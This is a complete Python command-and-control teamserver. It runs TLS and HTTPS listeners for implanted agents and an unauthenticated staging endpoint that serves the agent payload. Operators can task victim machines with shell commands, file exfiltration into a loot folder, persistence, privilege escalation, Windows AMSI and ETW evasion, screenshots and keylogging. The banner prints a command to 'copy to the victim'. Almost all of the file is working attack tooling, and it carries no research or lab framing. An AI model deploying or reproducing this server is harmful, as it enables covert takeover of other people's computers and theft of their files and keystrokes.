#!/usr/bin/env python3
"""
C2 Teamserver — pure stdlib (except optional openssl/cryptography for cert gen).

Listens on:
  4444  TCP+TLS agent transport
  8443  HTTPS agent transport
  5555  TLS operator transport (RBAC)

Features: SQLite backend, RBAC, malleable profiles, agent staging,
loot storage, offline watchdog, local admin console.
"""
import base64
import getpass
import hashlib
import hmac
import json
import os
import socket
import sqlite3
import ssl
import subprocess
import sys
import threading
import time
import uuid
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from common import (
    DEFAULT_PROFILE, PROTOCOL_VERSION, cert_fingerprint, json_dumps,
    json_loads, make_server_ctx, normalize_fp, recv_msg, send_msg,
)

# ─── Config ────────────────────────────────────────────────────────────
HOST = "0.0.0.0"
TCP_PORT = 4444
HTTPS_PORT = 8443
OP_PORT = 5555
CERT_PATH = "server.crt"
KEY_PATH = "server.key"
DB_PATH = "c2.db"
LOOT_DIR = "loot"
AGENT_PAYLOAD = "agent_payload.py"
BEACON_TIMEOUT = 300
WATCHDOG_INTERVAL = 30

PERSIST_CONN = {}   # agent_id -> {"token": str, "ip": str}


# ─── Cert generation ──────────────────────────────────────────────────
def ensure_cert():
    if os.path.exists(CERT_PATH) and os.path.exists(KEY_PATH):
        return
    print("[*] Generating TLS certificate...")
    # Try cryptography library first
    try:
        from cryptography import x509
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.x509.oid import NameOID
        from datetime import timedelta

        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "c2.local")])
        now = datetime.utcnow()
        cert = (
            x509.CertificateBuilder()
            .subject_name(name).issuer_name(name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now)
            .not_valid_after(now + timedelta(days=3650))
            .add_extension(x509.BasicConstraints(ca=True, path_length=None),
                           critical=True)
            .sign(key, hashes.SHA256())
        )
        with open(KEY_PATH, "wb") as f:
            f.write(key.private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.TraditionalOpenSSL,
                serialization.NoEncryption()))
        with open(CERT_PATH, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        print("[+] Certificate generated (cryptography)")
        return
    except ImportError:
        pass

    # Fall back to openssl command
    try:
        subprocess.run(
            ["openssl", "req", "-x509", "-newkey", "rsa:2048",
             "-keyout", KEY_PATH, "-out", CERT_PATH,
             "-days", "3650", "-nodes",
             "-subj", "/CN=c2.local"],
            check=True, capture_output=True)
        print("[+] Certificate generated (openssl)")
        return
    except (FileNotFoundError, subprocess.CalledProcessError) as e:
        raise SystemExit(
            "[!] Cannot generate TLS certificate.\n"
            "    Install one of:\n"
            "      pip install cryptography\n"
            "      apt install openssl      (Debian/Ubuntu)\n"
            "      brew install openssl     (macOS)\n"
            f"    Error: {e}"
        )


def cert_fp_from_file():
    with open(CERT_PATH, "r") as f:
        pem = f.read()
    der = ssl.PEM_cert_to_DER_cert(pem)
    return hashlib.sha256(der).hexdigest()


# ─── Crypto helpers ───────────────────────────────────────────────────
def hash_password(password, salt=None):
    salt = salt or os.urandom(16)
    h = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 200_000)
    return f"{salt.hex()}:{h.hex()}"


def verify_password(password, stored):
    try:
        salt_hex, hash_hex = stored.split(":")
        h = hashlib.pbkdf2_hmac(
            "sha256", password.encode(), bytes.fromhex(salt_hex), 200_000)
        return hmac.compare_digest(h.hex(), hash_hex)
    except Exception:
        return False


# ─── Database ─────────────────────────────────────────────────────────
class DB:
    def __init__(self, path):
        self.conn = sqlite3.connect(path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.lock = threading.Lock()
        self._schema()
        self._seed()

    def _schema(self):
        with self.lock:
            self.conn.executescript("""
                CREATE TABLE IF NOT EXISTS operators(
                    username TEXT PRIMARY KEY,
                    password TEXT NOT NULL,
                    role TEXT NOT NULL,
                    created_at REAL
                );
                CREATE TABLE IF NOT EXISTS agents(
                    id TEXT PRIMARY KEY,
                    machine_id TEXT,
                    hostname TEXT, username TEXT, os TEXT, os_version TEXT,
                    arch TEXT, pid INTEGER, ip TEXT,
                    token TEXT, info_json TEXT,
                    last_seen REAL, connected INTEGER, created_at REAL
                );
                CREATE TABLE IF NOT EXISTS tasks(
                    id TEXT PRIMARY KEY, agent_id TEXT, command TEXT,
                    args_json TEXT, status TEXT, operator TEXT,
                    created_at REAL, completed_at REAL
                );
                CREATE TABLE IF NOT EXISTS results(
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    task_id TEXT, agent_id TEXT, output TEXT, created_at REAL
                );
                CREATE TABLE IF NOT EXISTS profiles(
                    name TEXT PRIMARY KEY, user_agent TEXT,
                    register_uri TEXT, beacon_uri TEXT,
                    result_uri TEXT, headers_json TEXT
                );
                CREATE INDEX IF NOT EXISTS idx_agents_mid ON agents(machine_id);
                CREATE INDEX IF NOT EXISTS idx_tasks_agent ON tasks(agent_id, status);
            """)
            self.conn.commit()

    def _seed(self):
        with self.lock:
            c = self.conn.cursor()
            if c.execute("SELECT COUNT(*) FROM operators").fetchone()[0] == 0:
                print("[!] First run — set the admin password:")
                while True:
                    pw = getpass.getpass("    admin password: ")
                    if not pw:
                        print("    (cannot be empty)")
                        continue
                    pw2 = getpass.getpass("    confirm: ")
                    if pw != pw2:
                        print("    (mismatch, try again)")
                        continue
                    break
                c.execute("INSERT INTO operators VALUES (?,?,?,?)",
                          ("admin", hash_password(pw), "admin", time.time()))
                print("[+] Admin operator created.")
            if c.execute("SELECT COUNT(*) FROM profiles WHERE name=?",
                         (DEFAULT_PROFILE["name"],)).fetchone()[0] == 0:
                c.execute("INSERT INTO profiles VALUES (?,?,?,?,?,?)",
                          (DEFAULT_PROFILE["name"],
                           DEFAULT_PROFILE["user_agent"],
                           DEFAULT_PROFILE["register_uri"],
                           DEFAULT_PROFILE["beacon_uri"],
                           DEFAULT_PROFILE["result_uri"],
                           json.dumps(DEFAULT_PROFILE["headers"])))
            self.conn.commit()

    def execute(self, sql, args=()):
        with self.lock:
            cur = self.conn.execute(sql, args)
            self.conn.commit()
            return cur

    def query(self, sql, args=()):
        with self.lock:
            return self.conn.execute(sql, args).fetchall()


# ─── Core ─────────────────────────────────────────────────────────────
class C2Core:
    def __init__(self, db):
        self.db = db
        os.makedirs(LOOT_DIR, exist_ok=True)
        self._profiles = self._load_profiles()

    def _load_profiles(self):
        m = {}
        for r in self.db.query("SELECT * FROM profiles"):
            m[r["register_uri"]] = ("register", r["name"])
            m[r["beacon_uri"]] = ("beacon", r["name"])
            m[r["result_uri"]] = ("result", r["name"])
        return m

    # ── agent-facing ──────────────────────────────────────────────────
    def register_agent(self, info, ip):
        mid = info.get("machine_id")
        token = os.urandom(24).hex()
        existing = None
        if mid:
            rows = self.db.query(
                "SELECT id FROM agents WHERE machine_id=?", (mid,))
            if rows:
                existing = rows[0]["id"]

        if existing:
            aid = existing
            self.db.execute(
                "UPDATE agents SET token=?, last_seen=?, connected=1, ip=?, "
                "info_json=?, hostname=?, username=?, os=?, os_version=?, "
                "arch=?, pid=? WHERE id=?",
                (token, time.time(), ip, json.dumps(info),
                 info.get("hostname", "?"), info.get("user", "?"),
                 info.get("os", "?"), info.get("os_version", "?"),
                 info.get("arch", "?"), info.get("pid", 0), aid))
            PERSIST_CONN[aid] = {"token": token, "ip": ip}
            print(f"\n[+] Agent reconnected: {aid[:8]} "
                  f"{info.get('hostname')}@{ip}")
            print("[c2] > ", end="", flush=True)
            return aid, token

        aid = str(uuid.uuid4())
        self.db.execute(
            "INSERT INTO agents VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
            (aid, mid, info.get("hostname", "?"), info.get("user", "?"),
             info.get("os", "?"), info.get("os_version", "?"),
             info.get("arch", "?"), info.get("pid", 0), ip, token,
             json.dumps(info), time.time(), 1, time.time()))
        PERSIST_CONN[aid] = {"token": token, "ip": ip}
        print(f"\n[+] Agent online: {aid[:8]} "
              f"{info.get('hostname')}@{ip} ({info.get('os')})")
        print("[c2] > ", end="", flush=True)
        return aid, token

    def mark_offline(self, aid):
        self.db.execute("UPDATE agents SET connected=0 WHERE id=?", (aid,))

    def valid_token(self, aid, token):
        if not aid or not token:
            return False
        c = PERSIST_CONN.get(aid)
        if c and c.get("token") == token:
            return True
        rows = self.db.query("SELECT token FROM agents WHERE id=?", (aid,))
        return bool(rows and rows[0]["token"] == token)

    def beacon(self, aid):
        self.db.execute(
            "UPDATE agents SET last_seen=?, connected=1 WHERE id=?",
            (time.time(), aid))
        rows = self.db.query(
            "SELECT * FROM tasks WHERE agent_id=? AND status='pending' "
            "ORDER BY created_at ASC LIMIT 1", (aid,))
        if not rows:
            return {"type": "noop"}
        t = rows[0]
        self.db.execute("UPDATE tasks SET status='sent' WHERE id=?",
                        (t["id"],))
        return {"type": "task", "task_id": t["id"],
                "command": t["command"],
                "args": json.loads(t["args_json"] or "{}")}

    def submit_result(self, aid, task_id, output):
        self.db.execute(
            "INSERT INTO results(task_id,agent_id,output,created_at) "
            "VALUES (?,?,?,?)", (task_id, aid, output, time.time()))
        self.db.execute(
            "UPDATE tasks SET status='done', completed_at=? WHERE id=?",
            (time.time(), task_id))
        rows = self.db.query("SELECT * FROM tasks WHERE id=?", (task_id,))
        if rows and rows[0]["command"] == "download" and output and \
                not output.startswith("[!"):
            try:
                data = base64.b64decode(output)
                args = json.loads(rows[0]["args_json"] or "{}")
                fname = os.path.basename(args.get("path", "file")) or "file"
                dst = os.path.join(LOOT_DIR, f"{aid[:8]}_{fname}")
                with open(dst, "wb") as f:
                    f.write(data)
                print(f"\n[+] Loot saved: {dst} ({len(data)} bytes)")
                print("[c2] > ", end="", flush=True)
            except Exception as e:
                print(f"\n[!] loot save failed: {e}")

    # ── operator-facing ───────────────────────────────────────────────
    def process_command(self, session, cmd):
        name = cmd.get("cmd", "").lower()
        role = session.get("role")

        if name == "list":
            rows = self.db.query(
                "SELECT id,hostname,username,os,ip,last_seen,connected "
                "FROM agents ORDER BY created_at DESC")
            return {"status": "ok", "agents": [dict(r) for r in rows]}

        if name == "use":
            prefix = cmd.get("agent_id", "")
            rows = self.db.query(
                "SELECT id FROM agents WHERE id LIKE ?", (prefix + "%",))
            if len(rows) != 1:
                return {"status": "error", "msg": f"{len(rows)} match(es)"}
            session["current_agent"] = rows[0]["id"]
            return {"status": "ok", "agent_id": rows[0]["id"]}

        if name == "back":
            session["current_agent"] = None
            return {"status": "ok"}

        taskable = ("shell", "sysinfo", "ps", "env", "download", "upload",
                    "persist", "privesc", "amsi", "etw", "screenshot",
                    "keylog_start", "keylog_dump", "keylog_stop")
        if name in taskable:
            aid = session.get("current_agent")
            if not aid:
                return {"status": "error",
                        "msg": "no agent selected (use <id>)"}
            if role == "viewer":
                return {"status": "error",
                        "msg": "viewer role cannot task agents"}
            args = {k: v for k, v in cmd.items() if k != "cmd"}
            tid = str(uuid.uuid4())
            self.db.execute(
                "INSERT INTO tasks VALUES (?,?,?,?,?,?,?,?)",
                (tid, aid, name, json.dumps(args), "pending",
                 session.get("username", "?"), time.time(), None))
            return {"status": "ok", "task_id": tid, "command": name}

        if name == "results":
            aid = session.get("current_agent")
            rows = (self.db.query(
                "SELECT * FROM results WHERE agent_id=? ORDER BY id DESC LIMIT 20",
                (aid,)) if aid else self.db.query(
                "SELECT * FROM results ORDER BY id DESC LIMIT 30"))
            return {"status": "ok", "results": [
                {"task_id": r["task_id"], "output": r["output"],
                 "time": r["created_at"]} for r in rows]}

        if name == "list_operators":
            if role != "admin":
                return {"status": "error", "msg": "admin only"}
            rows = self.db.query(
                "SELECT username,role,created_at FROM operators")
            return {"status": "ok", "operators": [dict(r) for r in rows]}

        if name == "add_operator":
            if role != "admin":
                return {"status": "error", "msg": "admin only"}
            r = cmd.get("role", "operator")
            if r not in ("admin", "operator", "viewer"):
                return {"status": "error", "msg": "bad role"}
            try:
                self.db.execute(
                    "INSERT INTO operators VALUES (?,?,?,?)",
                    (cmd["username"], hash_password(cmd["password"]),
                     r, time.time()))
                return {"status": "ok"}
            except sqlite3.IntegrityError:
                return {"status": "error", "msg": "username exists"}

        if name == "remove_operator":
            if role != "admin":
                return {"status": "error", "msg": "admin only"}
            if cmd["username"] == "admin":
                return {"status": "error",
                        "msg": "cannot remove primary admin"}
            self.db.execute("DELETE FROM operators WHERE username=?",
                            (cmd["username"],))
            return {"status": "ok"}

        if name == "list_profiles":
            rows = self.db.query("SELECT * FROM profiles")
            return {"status": "ok", "profiles": [dict(r) for r in rows]}

        if name == "add_profile":
            if role != "admin":
                return {"status": "error", "msg": "admin only"}
            try:
                with open(cmd["path"], "r") as f:
                    p = json.load(f)
                self.db.execute(
                    "INSERT INTO profiles VALUES (?,?,?,?,?,?)",
                    (p["name"], p["user_agent"], p["register_uri"],
                     p["beacon_uri"], p["result_uri"],
                     json.dumps(p.get("headers", {}))))
                self._profiles = self._load_profiles()
                return {"status": "ok",
                        "msg": f"profile '{p['name']}' added"}
            except sqlite3.IntegrityError:
                return {"status": "error", "msg": "profile exists"}
            except Exception as e:
                return {"status": "error", "msg": str(e)}

        return {"status": "error", "msg": f"unknown command: {name}"}

    def authenticate(self, user, pw):
        rows = self.db.query(
            "SELECT * FROM operators WHERE username=?", (user,))
        if not rows or not verify_password(pw, rows[0]["password"]):
            return None
        return {"username": rows[0]["username"], "role": rows[0]["role"]}


# ─── TCP+TLS agent listener ───────────────────────────────────────────
def tcp_agent_loop(core, conn, addr):
    aid = None
    try:
        raw = recv_msg(conn)
        if not raw:
            return
        reg = json_loads(raw)
        if reg.get("version") != PROTOCOL_VERSION:
            return
        aid, token = core.register_agent(reg["info"], addr[0])
        send_msg(conn, json_dumps(
            {"status": "ok", "agent_id": aid, "token": token}))
        while True:
            data = recv_msg(conn)
            if not data:
                break
            msg = json_loads(data)
            if msg["type"] == "beacon":
                send_msg(conn, json_dumps(core.beacon(aid)))
            elif msg["type"] == "result":
                core.submit_result(aid, msg["task_id"],
                                   msg.get("output", ""))
    except Exception as e:
        print(f"\n[!] tcp agent {addr[0]}: {e}")
    finally:
        if aid:
            core.mark_offline(aid)
            print(f"\n[-] Agent offline: {aid[:8]}")
            print("[c2] > ", end="", flush=True)
        try:
            conn.close()
        except Exception:
            pass


def tcp_listener(core):
    ctx = make_server_ctx(CERT_PATH, KEY_PATH)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, TCP_PORT))
    s.listen(50)
    print(f"[*] TCP+TLS agent    ->  {HOST}:{TCP_PORT}")
    while True:
        raw_conn, addr = s.accept()
        try:
            conn = ctx.wrap_socket(raw_conn, server_side=True)
        except Exception as e:
            print(f"[!] TLS {addr[0]}: {e}")
            try:
                raw_conn.close()
            except Exception:
                pass
            continue
        threading.Thread(target=tcp_agent_loop,
                         args=(core, conn, addr), daemon=True).start()


# ─── HTTPS agent listener ─────────────────────────────────────────────
class HTTPSHandler(BaseHTTPRequestHandler):
    core = None
    profile = None

    def log_message(self, *args):
        pass  # silence

    def _send(self, code, body, content_type="application/json"):
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length) if length else b""

            if self.path == self.profile["register_uri"]:
                reg = json_loads(body)
                aid, token = self.core.register_agent(
                    reg["info"], self.client_address[0])
                self._send(200, json_dumps(
                    {"status": "ok", "agent_id": aid, "token": token}))
                return

            aid = self.headers.get("X-Agent-Id", "")
            tok = self.headers.get("X-Agent-Token", "")
            if not self.core.valid_token(aid, tok):
                self._send(401, b"unauthorized", "text/plain")
                return

            if self.path == self.profile["beacon_uri"]:
                self._send(200, json_dumps(self.core.beacon(aid)))
                return

            if self.path == self.profile["result_uri"]:
                msg = json_loads(body)
                self.core.submit_result(
                    aid, msg["task_id"], msg.get("output", ""))
                self._send(200, b"ok", "text/plain")
                return

            self._send(404, b"not found", "text/plain")
        except Exception as e:
            self._send(500, f"error: {e}".encode(), "text/plain")

    def do_GET(self):
        if self.path == "/stage":
            if os.path.exists(AGENT_PAYLOAD):
                with open(AGENT_PAYLOAD, "rb") as f:
                    data = f.read()
                self._send(200, data, "text/x-python")
                return
            self._send(404, b"not available", "text/plain")
            return
        self._send(404, b"not found", "text/plain")


def https_listener(core):
    HTTPSHandler.core = core
    # pick any registered profile for URL matching
    row = core.db.query(
        "SELECT * FROM profiles WHERE name='default'").fetchone()
    if row:
        HTTPSHandler.profile = {
            "register_uri": row["register_uri"],
            "beacon_uri": row["beacon_uri"],
            "result_uri": row["result_uri"],
        }
    else:
        HTTPSHandler.profile = DEFAULT_PROFILE
    srv = ThreadingHTTPServer((HOST, HTTPS_PORT), HTTPSHandler)
    ctx = make_server_ctx(CERT_PATH, KEY_PATH)
    srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
    print(f"[*] HTTPS agent      ->  {HOST}:{HTTPS_PORT}")
    srv.serve_forever()


# ─── Operator listener ────────────────────────────────────────────────
def operator_loop(core, conn, addr):
    session = None
    try:
        raw = recv_msg(conn)
        if not raw:
            return
        login = json_loads(raw)
        if login.get("cmd") != "login":
            send_msg(conn, json_dumps(
                {"status": "error", "msg": "login required"}))
            return
        user = core.authenticate(login.get("username", ""),
                                 login.get("password", ""))
        if not user:
            send_msg(conn, json_dumps(
                {"status": "error", "msg": "invalid credentials"}))
            return
        send_msg(conn, json_dumps(
            {"status": "ok", "username": user["username"],
             "role": user["role"]}))
        session = {**user, "current_agent": None}
        print(f"[*] Operator '{user['username']}' from {addr[0]}")
        while True:
            raw = recv_msg(conn)
            if not raw:
                break
            cmd = json_loads(raw)
            send_msg(conn, json_dumps(core.process_command(session, cmd)))
    except Exception as e:
        print(f"[!] operator {addr[0]}: {e}")
    finally:
        if session:
            print(f"[-] Operator '{session['username']}' disconnected")
        try:
            conn.close()
        except Exception:
            pass


def operator_listener(core):
    ctx = make_server_ctx(CERT_PATH, KEY_PATH)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, OP_PORT))
    s.listen(20)
    print(f"[*] Operator+TLS     ->  {HOST}:{OP_PORT}")
    while True:
        raw_conn, addr = s.accept()
        try:
            conn = ctx.wrap_socket(raw_conn, server_side=True)
        except Exception as e:
            print(f"[!] op TLS {addr[0]}: {e}")
            try:
                raw_conn.close()
            except Exception:
                pass
            continue
        threading.Thread(target=operator_loop,
                         args=(core, conn, addr), daemon=True).start()


# ─── Watchdog ─────────────────────────────────────────────────────────
def offline_watchdog(core):
    while True:
        time.sleep(WATCHDOG_INTERVAL)
        cutoff = time.time() - BEACON_TIMEOUT
        try:
            core.db.execute(
                "UPDATE agents SET connected=0 "
                "WHERE connected=1 AND last_seen < ?", (cutoff,))
        except Exception:
            pass


# ─── Local console ────────────────────────────────────────────────────
HELP_TEXT = """Commands:
  list                                 List agents
  use <id_prefix>                      Select agent
  back                                 Deselect
  shell <command>                      Execute shell command (queued)
  sysinfo                              Remote system info
  ps                                   Process list
  env                                  Environment variables
  download <remote_path>               Exfil file -> loot/
  upload <local_path> <remote_path>    Push file to agent
  persist <type>                       cron|rc|systemd|registry|schtask|
                                       startup|launchagent
  privesc                              Privilege-escalation enumeration
  amsi                                 Windows AMSI bypass
  etw                                  Windows ETW patch
  screenshot                           Capture screenshot (pillow on agent)
  keylog_start|dump|stop               Keylogger (pynput on agent)
  results                              Show recent results
  list_operators                       List operators (admin)
  add_operator <u> <p> <role>          Add operator   (admin)
  remove_operator <u>                  Remove operator(admin)
  list_profiles                        List malleable profiles
  add_profile <path.json>              Add profile from JSON (admin)
  help                                 Show this
  exit                                 Shutdown server"""


def parse_line(core, session, line):
    parts = line.split(maxsplit=3)
    if not parts:
        return None
    name = parts[0].lower()
    cmd = {"cmd": name}
    if name == "use":
        cmd["agent_id"] = parts[1] if len(parts) > 1 else ""
    elif name == "shell" and len(parts) > 1:
        cmd["command"] = line[len("shell "):].strip()
    elif name == "download" and len(parts) > 1:
        cmd["path"] = parts[1]
    elif name == "upload" and len(parts) > 2:
        try:
            with open(parts[1], "rb") as f:
                cmd["content"] = base64.b64encode(f.read()).decode()
            cmd["remote"] = parts[2]
        except Exception as e:
            return {"status": "error", "msg": str(e)}
    elif name == "persist" and len(parts) > 1:
        cmd["kind"] = parts[1]
    elif name == "add_operator" and len(parts) >= 3:
        cmd["username"] = parts[1]
        cmd["password"] = parts[2]
        cmd["role"] = parts[3] if len(parts) > 3 else "operator"
    elif name == "remove_operator" and len(parts) > 1:
        cmd["username"] = parts[1]
    elif name == "add_profile" and len(parts) > 1:
        cmd["path"] = parts[1]
    return core.process_command(session, cmd)


def display(core, session, result):
    if not result:
        return
    if result.get("status") == "error":
        print(f"[!] {result.get('msg')}")
        return
    if "agents" in result:
        if not result["agents"]:
            print("[*] No agents.")
            return
        print(f"{'ID':10} {'HOST':20} {'USER':15} {'OS':10} {'IP':15} {'LAST'}")
        for a in result["agents"]:
            alive = "alive" if a["connected"] else "dead"
            last = datetime.fromtimestamp(
                a["last_seen"] or 0).strftime("%H:%M:%S")
            print(f"{a['id'][:8]:10} {(a['hostname'] or '?')[:19]:20} "
                  f"{(a['username'] or '?')[:14]:15} "
                  f"{(a['os'] or '?')[:9]:10} "
                  f"{(a['ip'] or '?')[:14]:15} {last} {alive}")
    elif "agent_id" in result:
        print(f"[*] Agent selected: {result['agent_id'][:8]}")
    elif "task_id" in result:
        print(f"[*] Task queued: {result['command']} "
              f"({result['task_id'][:8]})")
    elif "results" in result:
        if not result["results"]:
            print("[*] No results yet.")
            return
        for r in result["results"]:
            print(f"--- {r['task_id'][:8]} ---")
            print((r["output"] or "")[:4000])
    elif "operators" in result:
        for o in result["operators"]:
            print(f"  {o['username']:20} {o['role']}")
    elif "profiles" in result:
        for p in result["profiles"]:
            print(f"  {p['name']:15} {p['register_uri']}")
    elif "msg" in result:
        print(f"[*] {result['msg']}")


def console(core):
    print(HELP_TEXT)
    session = {"username": "admin", "role": "admin", "current_agent": None}
    while True:
        try:
            tag = (session["current_agent"][:8]
                   if session["current_agent"] else "none")
            line = input(f"[c2:{tag}] > ").strip()
            if not line:
                continue
            if line.lower() == "exit":
                print("[*] Shutting down.")
                os._exit(0)
            if line.lower() == "help":
                print(HELP_TEXT)
                continue
            display(core, session, parse_line(core, session, line))
        except KeyboardInterrupt:
            print()
        except EOFError:
            os._exit(0)


# ─── Main ─────────────────────────────────────────────────────────────
def main():
    ensure_cert()
    fp = cert_fp_from_file()
    db = DB(DB_PATH)
    core = C2Core(db)

    print("")
    print("═" * 68)
    print("  Server cert SHA-256 fingerprint:")
    print(f"  {fp}")
    print("")
    print("  Copy this to the victim:")
    print(f"    python3 agent.py --host <THIS_IP> --cert-fp {fp}")
    print("═" * 68)
    print("")

    threading.Thread(target=tcp_listener, args=(core,), daemon=True).start()
    threading.Thread(target=https_listener, args=(core,), daemon=True).start()
    threading.Thread(target=operator_listener, args=(core,), daemon=True).start()
    threading.Thread(target=offline_watchdog, args=(core,), daemon=True).start()

    time.sleep(0.5)
    console(core)


if __name__ == "__main__":
    main()
